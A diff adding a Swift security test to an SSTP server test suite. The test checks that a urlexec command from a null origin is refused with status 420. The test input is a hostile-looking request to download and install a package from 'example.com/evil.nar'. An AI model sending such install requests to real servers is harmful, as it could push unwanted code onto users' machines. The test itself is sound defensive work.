@@ -358,6 +358,21 @@ struct ExternalServerTests {
     }
 
     @Test
+    func serverRefusesURLExecFromNullOriginEvenWhenExternalAllowed() throws {
+        let raw = """
+        EXECUTE SSTP/1.1\r
+        Sender: Test\r
+        Command: urlexec[x-ukagaka-link:type=install&url=https%3A%2F%2Fexample.com%2Fevil.nar]\r
+        SecurityOrigin: null\r
+        SecurityLevel: external\r
+        Charset: UTF-8\r
+        \r
+        """
+        let resp = makeServer(securityLocalOnly: false).handleRaw(raw)
+        #expect(resp.contains("420"))
+    }
+
+    @Test
     func serverParseFailureReturns400() throws {
         let resp = makeServer().handleRaw("garbage")
         #expect(resp.contains("400"))
